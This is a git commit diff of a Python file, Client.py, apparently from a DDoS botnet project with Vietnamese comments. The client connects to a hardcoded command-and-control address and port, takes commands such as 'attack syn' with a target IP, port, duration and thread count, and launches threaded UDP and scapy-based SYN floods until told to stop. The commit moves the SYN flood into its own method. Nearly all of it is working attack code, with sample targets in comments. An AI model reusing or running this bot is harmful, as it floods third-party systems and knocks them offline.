322683010e85fda43ec7ba82604f99c0b78c549e
tathaiduy <69078392+tathaiduy@users.noreply.github.com>
2022-02-22 18:27:32 +0700

    Update Client.py

--- Client.py
+++ Client.py
@@ -8,6 +8,7 @@ from typing import Tuple
 
 class Client():
     run=False
+    #118.71.27.70
     def __init__(self, connect:Tuple[str,int]=("118.71.27.70",9999)) -> None:
         signal.signal(signal.SIGINT, self.exit_gracefully)
         signal.signal(signal.SIGTERM, self.exit_gracefully)
@@ -35,7 +36,7 @@ class Client():
         self.sock.connect(connect)
         self.start()
 
-    def __ddos(self,*args):
+    def __ddos_udp(self,*args):
 
         def dos(*args): #*args truyền bao nhiêu tham số vào cũng dc
             t1=time()
@@ -55,6 +56,20 @@ class Client():
             Thread(target = dos,args=[*args]).start() #create a thread to perform of attack.
         sleep(int(args[3]))
         self.run=False
+    def __ddos_syn(self,*args):
+        def dos(*args):
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            local_ip = s.connect(("8.8.8.8", 80))
+            destination_IP = args[1]
+            destination_port = int(args[2])
+            i = 1
+            while self.run:
+                if not self.run:break
+                send(IP(src=local_ip, dst=destination_IP) / TCP(sport=80, dport=destination_port), loop=0,
+                     inter=0.0000001)
+                print("Packet sent: ", i)
+                i = i + 1
+        Thread(target=dos, args=[*args]).start()
 
     def _recv(self):
         return self.sock.recv(1024).decode("ascii").lower() #decode data send from server.
@@ -63,7 +78,7 @@ class Client():
         while True:
             data = self._recv()
             if "udp" in data:
-                #attack udp 27.64.57.85 50 120 3000
+                #attack udp 27.64.57.85 1000 120 3000
                 # attack udp 192.168.1.10 80 120 3000
                 data=data.replace("attack ","").split()
                 try:
@@ -76,24 +91,25 @@ class Client():
                     self.sock.send("invalid command".encode("ascii")) #if the code has exception from sending the data, we will send the "invalid command" back to the server.
                     continue
                 self.run = True
-                Thread(target=self.__ddos, args=data).start()
+                Thread(target=self.__ddos_udp, args=data).start()
             elif "syn" in data:
                 #attack syn 27.64.57.85 1000 120 5000
+                # attack syn 192.168.1.10 80 120 5000
                 data = data.replace("attack ", "").split()
                 try:
                     proto, ip, port, sec, thread = data
-                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                    local_ip = s.connect(("8.8.8.8", 80))
-                    destination_IP = ip
-                    destination_port = int(port)
-                    i = 1
-                    while True:
-                        send(IP(src=local_ip, dst=destination_IP) / TCP(sport=80, dport=destination_port), loop=0,inter=0.0000001)
-                        print("Packet sent: ",i)
-                        i = i + 1
+                    self.sock.send("done".encode("ascii"))
+                    # i = 1
+                    # while True:
+                    #     send(IP(src=local_ip, dst=destination_IP) / TCP(sport=80, dport=destination_port), loop=0,inter=0.0000001)
+                    #     print("Packet sent: ",i)
+                    #     i = i + 1
                 except Exception as e:
                     print(e)
                     self.sock.send("invalid command".encode("ascii"))  # if the code has exception from sending the data, we will send the "invalid command" back to the server.
+                    continue
+                self.run = True
+                Thread(target=self.__ddos_syn, args=data).start()
                  # create a thread to perform ddos attack.
             elif "kill" in data:
                 self.run=False
